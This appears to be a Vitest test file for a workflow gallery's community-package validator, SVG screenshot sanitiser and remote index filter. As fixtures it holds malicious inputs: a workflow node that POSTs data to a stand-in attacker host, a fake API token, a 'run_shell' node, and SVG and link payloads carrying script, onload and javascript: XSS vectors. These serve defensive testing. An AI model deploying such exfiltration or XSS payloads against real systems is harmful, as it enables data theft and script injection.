import { describe, expect, it } from 'vitest'
import { buildGalleryPackage, galleryContents } from '@/lib/gallery/build'
import { readGallerySource } from '@/lib/gallery/source'
import {
  cleanScreenshot, CommunityListingSchema, COMMUNITY_LIMITS, deriveEntryWorkflow, sanitizeSvgDocument, triggerKindOf, validateCommunityPackage,
} from '@/lib/gallery/community'
import { acceptRemoteEntries, galleryIndexUrl, DEFAULT_GALLERY_INDEX_URL } from '@/lib/gallery/remote-index'
import { toPackageFiles, type PackageContents } from '@/lib/packages/build'
import { packPackage } from '@/lib/packages/format'
import { readZip, writeZip } from '@/lib/packages/zip'

/* eslint-disable @typescript-eslint/no-explicit-any -- fixtures mutate free-form manifests */

const native = readGallerySource('visitor-sign-in')
const enterprise = readGallerySource('expense-claims')

function repack(contents: PackageContents): Uint8Array {
  const laid = toPackageFiles(contents)
  return packPackage({ header: laid.header, files: laid.files, signingKeyPem: null }).bytes
}

function mutate(fn: (contents: any) => void): Uint8Array {
  const contents = structuredClone(galleryContents(native)) as any
  fn(contents)
  return repack(contents)
}

const listing = {
  title: 'Visitor sign-in',
  summary: 'A themed reception form signs visitors in and tells their host, with nothing to configure.',
  description: 'Visitors sign in on a tablet; the host is looked up in a data table and emailed. An NDA task follows when confidential information is involved. Uses only built-in features.',
  category: 'workplace',
  tags: ['visitors', 'forms'],
  author_name: 'Grace Example',
}

describe('community package validation', () => {
  it('accepts a valid native package and an official enterprise package', () => {
    const a = validateCommunityPackage(buildGalleryPackage(native).bytes)
    expect(a.issues).toEqual([])
    expect(a.ok).toBe(true)
    expect(a.summary).toMatchObject({ slug: 'visitor-sign-in', native: true, requirement_count: 0, trigger: 'form', signed: false })
    const b = validateCommunityPackage(buildGalleryPackage(enterprise).bytes)
    expect(b.ok).toBe(true)
    expect(b.summary?.native).toBe(false)
    expect(b.summary?.hosts.every((h) => h.endsWith('example.com'))).toBe(true)
  })

  it('rejects files that are not packages, too large or tampered with', () => {
    expect(validateCommunityPackage(new Uint8Array([1, 2, 3])).ok).toBe(false)
    expect(validateCommunityPackage(new Uint8Array(0)).issues[0].message).toMatch(/empty/)
    const big = new Uint8Array(COMMUNITY_LIMITS.packageBytes + 1)
    expect(validateCommunityPackage(big).issues[0].message).toMatch(/limit is 5 MB/)
    // Change a workflow after it was built (the manifest's file hash no longer matches).
    const entries = readZip(buildGalleryPackage(native).bytes).map((e) => e.path.includes('/workflows/') ? { ...e, data: Buffer.from(Buffer.from(e.data).toString('utf8').replace('Visitor arrival', 'Visitor exfil')) } : e)
    const tampered = validateCommunityPackage(writeZip(entries))
    expect(tampered.ok).toBe(false)
    expect(tampered.issues.map((i) => i.message).join(' ')).toMatch(/modified/)
  })

  it('rejects malicious packages: secrets, raw HTTP, real hosts, unknown nodes, custom code', () => {
    const secret = validateCommunityPackage(mutate((c) => {
      c.assets.integrations = [{ id: '5b1d6f1e-0000-4000-8000-000000000001', name: 'Exfil', type: 'rest_api', config: { base_url: 'https://collector.example.com' }, auth_config: { token: 'sk-live-abcdefghijklmnopqrstuvwxyz' } }]
    }))
    expect(secret.ok).toBe(false)
    expect(secret.issues.map((i) => i.message).join(' ')).toMatch(/credential|secret/i)

    const http = validateCommunityPackage(mutate((c) => {
      const wf = c.assets.workflows[0]
      wf.nodes.push({ id: 'exfil', type: 'http_request', label: 'Send data out', position: { x: 0, y: 0 }, config: { url: 'https://attacker.test/collect', method: 'POST' } })
      wf.edges.push({ id: 'e-exfil', source: 'row', target: 'exfil' })
    }))
    expect(http.ok).toBe(false)
    expect(http.issues.map((i) => i.message).join(' ')).toMatch(/http_request/)

    const host = validateCommunityPackage(mutate((c) => {
      c.assets.integrations = [{ id: '5b1d6f1e-0000-4000-8000-000000000002', name: 'Real', type: 'rest_api', config: { base_url: 'https://api.attacker.io/v1' }, auth_config: { token: '__SECRET__' } }]
    }))
    expect(host.issues.map((i) => i.message).join(' ')).toMatch(/placeholder/)

    const unknown = validateCommunityPackage(mutate((c) => { c.assets.workflows[0].nodes[1].type = 'run_shell' }))
    expect(unknown.issues.map((i) => i.message).join(' ')).toMatch(/unknown type "run_shell"/)

    const code = validateCommunityPackage(mutate((c) => { c.assets.workflow_activities = [{ id: '5b1d6f1e-0000-4000-8000-000000000003', name: 'Code', key: 'x', source_code: 'process.exit()' }] }))
    expect(code.issues.map((i) => i.message).join(' ')).toMatch(/custom code/)

    const dangling = validateCommunityPackage(mutate((c) => { c.assets.workflows[0].nodes[0].config.form_id = '5b1d6f1e-0000-4000-8000-0000000000ff' }))
    expect(dangling.ok).toBe(false)
  })

  it('derives the entry workflow and its trigger kind', () => {
    const contents = galleryContents(native)
    const entry = deriveEntryWorkflow(contents.assets)
    expect(entry.id).toBe(native.meta.entry_workflow)
    expect(triggerKindOf(entry)).toBe('form')
    expect(triggerKindOf({ trigger_type: 'schedule' })).toBe('schedule')
    expect(triggerKindOf({ trigger_type: 'webhook_received', nodes: [] })).toBe('api')
  })

  it('checks sample input against the entry form', () => {
    const bytes = buildGalleryPackage(native).bytes
    expect(validateCommunityPackage(bytes, { sample_input: { visitor_name: 'A', host: 'x@example.com', purpose: 'Meeting', agree: true } }).ok).toBe(true)
    const bad = validateCommunityPackage(bytes, { sample_input: { not_a_field: 1 } })
    expect(bad.issues.map((i) => i.message).join(' ')).toMatch(/not_a_field/)
  })
})

describe('community listing metadata', () => {
  it('defaults the licence to Apache-2.0 and refuses markup and bad links', () => {
    expect(CommunityListingSchema.parse(listing).licence).toBe('Apache-2.0')
    expect(CommunityListingSchema.safeParse({ ...listing, title: '<script>x</script>' }).success).toBe(false)
    expect(CommunityListingSchema.safeParse({ ...listing, author_url: 'javascript:alert(1)' }).success).toBe(false)
    expect(CommunityListingSchema.safeParse({ ...listing, category: 'nope' }).success).toBe(false)
    expect(CommunityListingSchema.safeParse({ ...listing, extra: 1 }).success).toBe(false)
    expect(CommunityListingSchema.parse({ ...listing, author_url: 'https://example.com/me', licence: 'MIT' })).toMatchObject({ licence: 'MIT', author_url: 'https://example.com/me' })
  })
})

describe('community screenshots', () => {
  const svg = (body: string) => ({ name: 'shot.svg', type: 'image/svg+xml', bytes: new TextEncoder().encode(body) })

  it('sanitises SVG screenshots (scripts, handlers, external references, animation)', () => {
    const result = cleanScreenshot(svg('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(2)</script><a href="https://attacker.test"><rect width="10" height="10" fill="url(https://attacker.test/x)"/></a><image href="data:text/html,hi"/><set attributeName="href" to="javascript:alert(3)"/><foreignObject><div>x</div></foreignObject><rect fill="url(#g)"/></svg>'))
    expect('error' in result).toBe(false)
    const text = new TextDecoder().decode((result as { bytes: Uint8Array }).bytes)
    expect(text).not.toMatch(/script|onload|attacker|javascript|foreignObject|<set|data:text/i)
    expect(text).toMatch(/url\(#g\)/)
    expect(text.startsWith('<svg')).toBe(true)
  })

  it('refuses images whose bytes do not match their type, and oversized or unsupported files', () => {
    expect(cleanScreenshot({ name: 'fake.png', type: 'image/png', bytes: new TextEncoder().encode('<html>') })).toHaveProperty('error')
    expect(cleanScreenshot({ name: 'x.gif', type: 'image/gif', bytes: new Uint8Array([0x47, 0x49, 0x46]) })).toHaveProperty('error')
    expect(cleanScreenshot({ name: 'big.png', type: 'image/png', bytes: new Uint8Array(COMMUNITY_LIMITS.screenshotBytes + 1) })).toHaveProperty('error')
    const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0])
    expect(cleanScreenshot({ name: 'ok.png', type: 'image/png', bytes: png })).toMatchObject({ type: 'image/png', ext: 'png' })
    expect(sanitizeSvgDocument('<html><svg></svg></html>')).toBeNull()
  })
})

describe('remote community index (self-hosted Browse gallery)', () => {
  const url = 'https://usertasks.com/api/gallery/index'
  const entry = (slug: string, file: string, source = 'community') => ({ id: slug, slug, title: slug, summary: 's', tags: [], category: 'workplace', trigger: 'form', version: '1.0.0', file, file_name: `${slug}.utpkg`, page: `/gallery/community/${slug}`, source, author: { name: 'A', url: 'javascript:x' } })

  it('keeps only community entries downloadable from the index origin', () => {
    const accepted = acceptRemoteEntries({ packages: [
      entry('good', 'https://usertasks.com/api/gallery/community/good/download'),
      entry('relative', '/api/gallery/community/relative/download'),
      entry('foreign', 'https://attacker.test/api/gallery/community/foreign/download'),
      entry('wrong-path', 'https://usertasks.com/files/evil.utpkg'),
      entry('official', 'https://usertasks.com/gallery/official.utpkg', 'official'),
      entry('Bad Slug', 'https://usertasks.com/api/gallery/community/Bad Slug/download'),
    ] }, url)
    expect(accepted.map((e) => e.slug)).toEqual(['good', 'relative'])
    expect(accepted[1].file).toBe('https://usertasks.com/api/gallery/community/relative/download')
    expect(accepted[0].author?.url).toBeNull()
  })

  it('reads GALLERY_INDEX_URL (default usertasks.com, off, https only)', () => {
    expect(galleryIndexUrl(undefined)).toBe(DEFAULT_GALLERY_INDEX_URL)
    expect(galleryIndexUrl('off')).toBeNull()
    expect(galleryIndexUrl('http://intranet/gallery')).toBeNull()
    expect(galleryIndexUrl('https://gallery.example.com/api/gallery/index')).toBe('https://gallery.example.com/api/gallery/index')
  })
})
